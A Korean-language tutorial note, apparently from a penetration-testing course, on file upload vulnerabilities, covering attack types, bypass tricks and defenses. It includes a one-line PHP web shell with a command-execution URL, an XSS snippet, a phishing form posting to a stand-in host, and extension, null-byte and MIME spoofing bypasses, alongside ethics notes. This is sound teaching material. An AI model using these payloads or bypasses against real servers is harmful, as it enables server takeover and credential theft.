# File Upload Vulnerability

`File Upload Vulnerability`는 공격자가 서버에 임의의 악성 파일을 업로드할 수 있는 취약점을 의미한다.<br>
검증 없이 파일을 수용할 경우, 서버 내 코드 실행, 정보 탈취, 웹사이트 변조 등 **다양한 2차 공격**으로 이어질 수 있다.<br>
파일 실행 결과나 응답을 직접 확인하지 않더라도, 업로드 위치와 실행 권한을 확인함으로써 **치명적인 보안 위협**을 유발할 수 있다.

---

## 주요 기법

| 기법              | 설명                                                                 |
|------------------|----------------------------------------------------------------------|
| **웹쉘 업로드**   | `.php`, `.jsp` 등의 서버 실행 스크립트를 업로드하여 명령어 실행   | 
| **피싱 파일 업로드**     | 로그인 페이지로 위장한 HTML 파일을 업로드하여 사용자를 속임 |
| **디페이스 공격**     | `index.html` 등 주요 페이지를 덮어씌워 웹사이트를 변조 |
| **Stored XSS**     | HTML/JS가 삽입된 파일을 업로드하여 스크립트 공격 실행 |
| **DoS 공격**     | 초대형 파일 다량 업로드로 서버 자원 고갈 | 

---

## 공격 흐름 및 예시 절차
1. **업로드 기능 탐지**
2. **허용 확장자 확인 및 우회 시도**
3. **업로드 후 저장 경로 파악**
4. **웹쉘 실행 확인 및 명령 수행**
5. **파일 내부 코드 삽입 또는 변조**
6. **그 외 XSS/피싱/DOS 확장 공격**

---

## 웹쉘 업로드 예시

```php
<!-- shell.php -->
<?php system($_GET['cmd']); ?>
```

업로드 성공 후 다음과 같이 명령 실행:
```bash
http://target.com/uploads/shell.php?cmd=whoami
```
`.php`, `.jsp`, `.asp`, `.phtml`, `.php3`, `.php5` 등의 다양한 확장자 우회를 시도할 수 있음.

---

## 파일 우회 및 위장 기법

| 우회방식                         | 설명 |
|------------------------------|----------------|
| 확장자 대소문자 우회                 | `.PhP`, `.pHp`, `.phtml` 등으로 필터 우회 시도 |
| 이중 확장자 사용               | `shell.jpg.php` 또는 `image.php%00.jpg` 등 우회 기법 사용 |
| MIME Type 위장          | `Content-Type: image/jpeg` 등으로 위장하고 실제 내용은 PHP 코드로 구성 |
| 그림 웹쉘    | 실제 이미지에 웹쉘 삽입 (hex editor 사용) |
| 경로 조작  | `../../` 등을 통해 저장 경로를 변경하거나 시스템 파일 경로 접근 시도 |

---

## 방어 방법 및 보안 설정

| 대응 방법                 | 설명                                               |
| --------------------- | ------------------------------------------------ |
| **파일 확장자 화이트리스트**     | 이미지 등 필요한 파일만 업로드 허용 (예: `.jpg`, `.png`, `.pdf`) |
| **MIME Type 검사**      | 서버 측에서 `Content-Type` 확인 및 클라이언트 조작 탐지           |
| **실행권한 제거**           | 업로드 경로(`uploads`)를 실행 경로에서 분리하고 웹서버 실행 권한 제거     |
| **파일명 무작위화 및 경로 은닉**  | 파일명은 UUID 등 난수화, 경로는 외부에서 추측 불가능하도록 구성           |
| **파일 시그니처 검사**        | 확장자가 아닌 파일 헤더(Magic Number)를 기준으로 실제 포맷 확인       |
| **사이즈 제한 및 업로드 수 제한** | 대용량 DoS 공격 방지용 업로드 용량 제한 설정                      |

---

## 자주 사용하는 업로드 파일 예시

| 목적              | 파일 내용 예시                                     |
| --------------- | -------------------------------------------- |
| PHP 웹쉘          | `<?php system($_GET['cmd']); ?>`             |
| XSS 파일          | `<script>alert(1)</script>`                  |
| 피싱 HTML 페이지     | `<form action="http://phish.com">...</form>` |
| 업로드 테스트 (더미 파일) | 빈 텍스트 파일, 1x1 png 이미지 등                      |

---

## 공격 시 유의사항 (모의해킹 관점)
- 실제 **웹쉘 실행은 절대 금지** (정당한 허가 없는 경우 불법)
- **업로드 가능 여부와 실행 가능 여부**만 판단한 후, 테스트 파일 즉시 삭제
- 파일 업로드 성공 후에는 **파일 접근 경로 확인만 수행**
- 자동화 도구 사용 시, **로그 남김/서버 부하 유의**
- 보안 감사에서는 **접근 경로, 실행 여부, 응답 메시지 차이 분석** 위주로 진행

## 정리

> `File Upload Vulnerability`는 단순한 파일 전송 기능처럼 보이지만, **웹쉘 실행, XSS, DoS, 피싱** 등 **광범위한 공격으로 연결**될 수 있는 심각한 보안 취약점이다.

> 특히 실행 권한과 경로 노출이 조합될 경우 **서버 전체를 장악**하는 일이 발생할 수 있으므로, **확장자 및 MIME 검증, 실행 차단** 등 복합적인 보안 조치가 필수적이다.

> 테스트 시에는 반드시 **모의해킹 윤리 준수**와 **행위 범위 제한**을 명확히 해야 한다.

## 참고 사이트
>[SegaFalut Academy](https://academy.segfaulthub.com/ "nomaltic 해킹 강의")

<hr />